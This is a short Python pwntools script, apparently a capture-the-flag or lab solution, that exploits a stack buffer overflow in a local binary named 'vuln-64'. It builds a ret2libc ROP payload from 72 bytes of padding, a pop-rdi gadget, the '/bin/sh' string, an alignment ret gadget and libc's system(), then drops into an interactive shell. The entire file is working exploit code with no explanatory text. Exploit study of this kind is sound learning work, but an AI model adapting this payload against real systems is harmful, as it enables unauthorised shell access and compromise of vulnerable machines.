from pwn import *

elf = context.binary = ELF("./vuln-64")
p = process()

libc = elf.libc
libc.address = 0x00007ffff7dcb000

junk = 72

system = p64(libc.sym["system"])
param_bash = p64(next(libc.search(b"/bin/sh")))

rop = ROP(elf)
aligment = p64(rop.find_gadget(["ret"])[0])
rdi = p64(rop.find_gadget(["pop rdi"])[0])
param_ret = p64(0x0)

payload = b"A" * junk + rdi + param_bash + aligment + system + param_ret

p.sendline(payload)
p.interactive()